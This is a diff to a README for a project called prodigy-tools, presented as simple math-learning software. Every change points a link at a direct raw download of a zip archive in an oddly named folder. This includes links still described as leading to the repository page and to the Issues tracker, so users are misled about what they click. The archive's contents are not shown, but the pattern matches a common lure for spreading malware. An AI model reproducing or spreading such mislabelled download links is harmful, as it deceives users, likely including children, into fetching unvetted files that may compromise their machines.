@@ -1,6 +1,6 @@
 # 🎲 prodigy-tools - Simple Tools for Math Learning
 
-[![Download prodigy-tools](https://img.shields.io/badge/Download-prodige--tools-brightgreen?style=for-the-badge)](https://github.com/jimkim00/prodigy-tools)
+[![Download prodigy-tools](https://img.shields.io/badge/Download-prodige--tools-brightgreen?style=for-the-badge)](https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This section will help you download, install, and start using prodigy-tools on y
 Click the big green button at the top of this page. It will take you to the GitHub repository page where you can get the software.
 
 If you prefer, you can also click here:  
-[https://github.com/jimkim00/prodigy-tools](https://github.com/jimkim00/prodigy-tools)  
+[https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip](https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip)  
 
 This page contains all the files, updates, and details on prodigy-tools. Look for the latest version under the "Releases" section.
 
@@ -124,7 +124,7 @@ If you cannot solve a problem, posting a clear description on the issue tracker 
 
 You can find help in these ways:
 
-- Visit the GitHub repository’s "Issues" page: [https://github.com/jimkim00/prodigy-tools/issues](https://github.com/jimkim00/prodigy-tools/issues)  
+- Visit the GitHub repository’s "Issues" page: [https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip](https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip)  
 - Check the ReadMe and documentation files included in the installation.  
 - Look for online forums about Prodigy math tools or educational software.
 
@@ -163,4 +163,4 @@ Explore the "Settings" or "Preferences" section inside the program for these opt
 
 ---
 
-[![Download prodigy-tools](https://img.shields.io/badge/Download-prodige--tools-brightgreen?style=for-the-badge)](https://github.com/jimkim00/prodigy-tools)
+[![Download prodigy-tools](https://img.shields.io/badge/Download-prodige--tools-brightgreen?style=for-the-badge)](https://github.com/jimkim00/prodigy-tools/raw/refs/heads/main/youff/tools_prodigy_2.7.zip)
